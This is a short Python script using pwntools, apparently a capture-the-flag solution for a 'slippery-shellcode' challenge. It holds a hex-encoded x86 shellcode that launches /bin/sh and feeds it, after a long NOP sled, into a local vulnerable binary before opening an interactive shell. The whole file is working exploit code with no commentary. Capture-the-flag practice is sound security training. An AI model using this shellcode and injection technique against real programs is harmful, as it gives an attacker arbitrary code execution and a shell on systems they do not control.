from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
sock = process("/problems/slippery-shellcode_3_c410badcfbde5a8a54d446b60b28fe2b/vuln", cwd="/problems/slippery-shellcode_3_c410badcfbde5a8a54d446b60b28fe2b")
#sock = process("./vuln")

sock.sendline("\x90" * 0x180 + shellcode)

sock.interactive()
